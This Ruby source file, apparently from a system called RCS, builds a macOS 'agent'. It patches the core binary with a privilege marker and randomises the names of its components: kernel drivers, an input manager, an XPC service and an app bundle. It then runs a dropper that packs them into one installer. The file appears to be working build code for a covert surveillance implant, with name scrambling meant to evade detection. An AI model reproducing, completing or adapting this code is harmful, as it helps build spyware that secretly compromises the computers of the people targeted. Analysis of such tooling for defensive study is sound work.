#
#  Agent creation for osx
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildOSX < Build

  def initialize
    super
    @platform = 'osx'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

    # open the core and binary patch the parameter for the "require admin privs"
    file = File.open(path(@scrambled[:core]), 'rb+')
    content = file.read

    # working method marker
    begin
      method = params['admin'] ? 'Ah57K' : 'Ah56K'
      method += SecureRandom.random_bytes(27)
      content['iuherEoR93457dFADfasDjfNkA7Txmkl'] = method
    rescue
      raise "Working method marker not found"
    end

    file.rewind
    file.write content
    file.close

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7) + '.app'
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    inputmanager = scramble_name(config, 2)
    driver = scramble_name(config, 4)
    driver64 = scramble_name(config, 16)
    xpc = scramble_name(config, 8)
    icon = "q45tyh"
        
    @scrambled = {core: core, dir: dir, config: config, inputmanager: inputmanager,
                  icon: icon, xpc: xpc, driver: driver, driver64: driver64}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
    
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                        path(@scrambled[:config])+' '+
                                        path(@scrambled[:driver])+' '+
                                        path(@scrambled[:driver64])+' '+
                                        path(@scrambled[:inputmanager])+' '+
                                        path(@scrambled[:icon])+' '+
                                        path(@scrambled[:dir])+' '+
                                        path('default')+' '+
                                        path('output')

    File.exist? path('output') || raise("output file not created by dropper")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs << 'output'
  end

end

end #DB::
end #RCS::
